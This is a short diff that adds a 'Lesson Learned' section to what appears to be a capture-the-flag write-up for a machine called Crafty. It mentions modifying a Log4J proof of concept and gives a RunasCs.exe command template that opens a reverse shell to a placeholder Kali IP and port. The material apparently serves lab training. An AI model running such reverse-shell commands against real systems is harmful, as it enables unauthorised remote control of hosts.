@@ -237,3 +237,9 @@ whoami
 crafty\administrator
 ```
 Get your root flag.
+
+
+### Lesson Learned
+
+1.  Log4J PoC needs modification to run
+2.  When SMB, LDAP, Kerberos or WinRM is not present, you will use `RunasCs.exe` to run Administrative Shell. The command to use is `.\RunasCs.exe <Admin> <Admin_Pass> cmd -r <kali_ip>:port`. 
